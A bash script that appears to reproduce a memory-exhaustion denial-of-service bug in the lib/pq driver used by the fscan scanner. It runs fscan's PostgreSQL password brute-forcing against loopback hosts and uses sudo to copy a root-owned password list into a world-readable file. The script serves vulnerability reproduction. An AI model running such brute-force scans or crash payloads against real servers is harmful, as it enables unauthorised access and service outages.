#!/bin/bash
# Max-length DoS demonstration: a 5-byte reply declaring n=2147483643 (~2.15GB)
# makes lib/pq attempt a ~2.15GB uncapped allocation (largest positive pq
# length on this 32-bit build). RUN 1 = default system (no limits, like the
# incident). RUN 2 = RLIMIT_AS for a deterministic Go fatal.
cd /home/rasp
: > /home/rasp/bigalloc.payloads

sudo -n cp -f /root/passbr.txt /home/rasp/pass.txt 2>/dev/null
sudo -n chmod 644 /home/rasp/pass.txt 2>/dev/null

BASE="-lang en -pwdf /home/rasp/pass.txt -np -h 127.0.0.1,127.0.0.2,127.0.0.3,127.0.0.4,127.0.0.5 -t 64 -time 4 -nocolor -nopg -gt 30 -socks5 127.0.0.1:1080 -nsp -m postgresql -p 5433"

echo "=== memory before ==="
free -m | head -3

echo "=== RUN 1: default system, no limits (incident conditions) ==="
timeout 90 /home/rasp/fscan $BASE > /home/rasp/maxlen_nolimit.log 2>&1
echo "exit=$?"
grep -n -m 8 -E "fatal error|out of memory|recvMessage|makeslice|Killed" /home/rasp/maxlen_nolimit.log || tail -5 /home/rasp/maxlen_nolimit.log
echo "--- dmesg (OOM killer evidence) ---"
sudo -n dmesg 2>/dev/null | tail -6

echo "=== RUN 2: ulimit -v 2000000 (deterministic Go fatal) ==="
(
  ulimit -v 2000000 || exit 99
  exec /home/rasp/fscan $BASE > /home/rasp/maxlen_ulimit.log 2>&1
)
echo "exit=$?"
grep -n -m 8 -E "fatal error|out of memory|recvMessage|makeslice" /home/rasp/maxlen_ulimit.log || tail -5 /home/rasp/maxlen_ulimit.log

echo "=== payload log (direct arrival = proxy bypass proof) ==="
head -8 /home/rasp/bigalloc.payloads 2>/dev/null

echo "=== memory after ==="
free -m | head -3
echo "TEST_DONE"
